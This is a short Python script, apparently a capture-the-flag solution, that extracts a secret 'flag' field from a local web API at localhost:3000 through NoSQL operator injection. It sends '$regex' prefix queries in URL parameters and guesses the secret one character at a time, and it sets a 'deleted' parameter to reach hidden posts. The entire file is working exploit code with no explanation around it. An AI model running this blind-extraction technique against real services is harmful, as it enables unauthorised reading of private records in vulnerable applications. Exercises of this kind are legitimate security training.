import string
from urllib.parse import urlencode

import requests

base_url = "http://localhost:3000/api/v1/post"
table = string.ascii_lowercase + string.ascii_uppercase + string.digits + "{}_"

flag = ""

while True:
    for char in table:
        params = {
            "searchParam[deleted]": "true",
            "searchParam[flag][$regex]": f"^{flag}{char}"
        }
        query_string = urlencode(params)
        result = requests.get(f"{base_url}?{query_string}")
        posts = result.json()
        if len(posts) > 0:
            flag += char
            print(flag)
            break
    if "}" in flag:
        break

print("flag", flag)
